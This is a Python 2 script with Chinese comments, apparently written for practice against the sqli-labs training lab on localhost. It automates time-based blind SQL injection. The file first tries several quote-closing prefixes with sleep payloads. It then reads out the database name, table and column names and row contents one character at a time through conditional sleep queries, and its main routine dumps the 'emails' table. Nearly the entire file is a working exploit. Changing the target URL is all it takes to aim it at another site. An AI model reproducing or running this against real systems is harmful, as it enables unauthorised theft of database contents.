# _*_ coding:utf-8 _*_
import urllib
import datetime
target = 'http://127.0.0.1/sqli-labs-master/Less-8/?id=1'
#判断注入点是否可用函数
#为了尽可能的在判断上通用，选择布尔时间判断
#不提供固定阈值而是通过，请求带payload页面和无payload页面的时间差是否大于sleep的时间来判断
#这里选择and逻辑 是因为or逻辑会拖长时间
#prefix_payload的第一位为异常的前缀，代表正常请求返回的时间
def is_injectable():
	prefix_payload = ['',' ','\' ','\" ','\') ','\") ',') ']
	suffix_payload = 'and sleep(1) --+'
	for i in prefix_payload:
		payload = i + suffix_payload
		url = target + payload
		start_time = datetime.datetime.now()
		urllib.urlopen(url)
		end_time = datetime.datetime.now()
		if 'tmp1' in dir():
			tmp2 = (end_time - start_time).seconds
		else:
			tmp1 = (end_time - start_time).seconds
		if 'tmp2' in dir():
			if abs(tmp2 - tmp1) > 1:
				return tmp1,i
	return 0
#这里考虑到sleep的特性，如果采用手工注入的二分思维，可能会sleep多次，从而导致盲注时间过长
#所以我选择遍历的方法，虽然会进行多次的循环，但是只会有一次sleep，总的来说时间还是比较少的
#prefix 注入判断是确定的闭合符 ，normal_time 正常请求的响应时间
def brute(prefix,normal_time):
	#result = {}
	#DB_name = getcurrentDB(prefix,normal_time)
	#table = getTable(prefix,normal_time,DB_name)
	#result.setdefault(DB_name,table)
	#print result
	print dump(prefix,normal_time,'emails','id')
def getcurrentDB(prefix,normal_time):
	DB_length = getLength(prefix,normal_time,'length((select database()))',20)
	DB_name = getName(prefix,normal_time,'(select database())',DB_length+1)
	return DB_name
def getTable(prefix,normal_time,DB_name):
	result = {}
	table_count = getLength(prefix,normal_time,'(select count(table_name) from information_schema.tables where table_schema = \'%s\')'%(DB_name),20)
	for i in range(0,table_count): 
		table_length = getLength(prefix,normal_time,'(select length(table_name) from information_schema.tables where table_schema = \'%s\' limit %d,1)'%(DB_name,i),20)
		table_name = getName(prefix,normal_time,'(select table_name from information_schema.tables where table_schema = \'%s\' limit %d,1)'%(DB_name,i),table_length+1)
		result.setdefault(table_name,[])
	return result
def getColumn(prefix,normal_time,DB_name,table_name):
	result = []
	column_count = getLength(prefix,normal_time,'(select count(column_name) from information_schema.columns where table_schema = \'%s\' and table_name = \'%s\')'%(DB_name,table_name),20)
	for i in range(0,column_count): 
		column_length = getLength(prefix,normal_time,'(select length(column_name) from information_schema.columns where table_schema = \'%s\' and table_name = \'%s\' limit %d,1)'%(DB_name,table_name,i),20)
		column_name = getName(prefix,normal_time,'(select column_name from information_schema.columns where table_schema = \'%s\' and table_name = \'%s\' limit %d,1)'%(DB_name,table_name,i),column_length+1)
		result.append(column_name)
	return result
def dump(prefix,normal_time,table_name,column_name):
	result = []
	data_num = getLength(prefix,normal_time,'(select count(%s) from %s)'%(column_name,table_name),20)
	for i in range(0,data_num):
		data_length = getLength(prefix,normal_time,'(select length(%s) from %s limit %d,1)'%(column_name,table_name,i),20)
		data = getName(prefix,normal_time,'(select %s from %s limit %d,1)'%(column_name,table_name,i),data_length+1)
		result.append(data)
	return result
def getLength(prefix,normal_time,payload,leng):
	for i in range(1,leng):
		url = target + prefix + 'and if(%s = %d,sleep(1),0) --+' % (payload,i)
		start_time = datetime.datetime.now()
		urllib.urlopen(url)
		end_time = datetime.datetime.now()
		if (end_time - start_time).seconds - normal_time >= 1:
			return i
def getName(prefix,normal_time,payload,leng):
	name = ''
	for i in range(leng):
		for j in range(32,127):
			url = target + prefix + 'and if(ascii(substr(%s,%d,1))=%d,sleep(1),0) --+' % (payload,i,j)
			start_time = datetime.datetime.now()
			urllib.urlopen(url)
			end_time = datetime.datetime.now()
			if (end_time - start_time).seconds - normal_time >= 1:
				name += chr(j)
	return name
if __name__ == '__main__':
	'''
	basic_judge = is_injectable()
	if basic_judge:
		print "it seem injectable !!!"

	else:
		print "it not injectable _~_"
	'''
	brute('\'',0)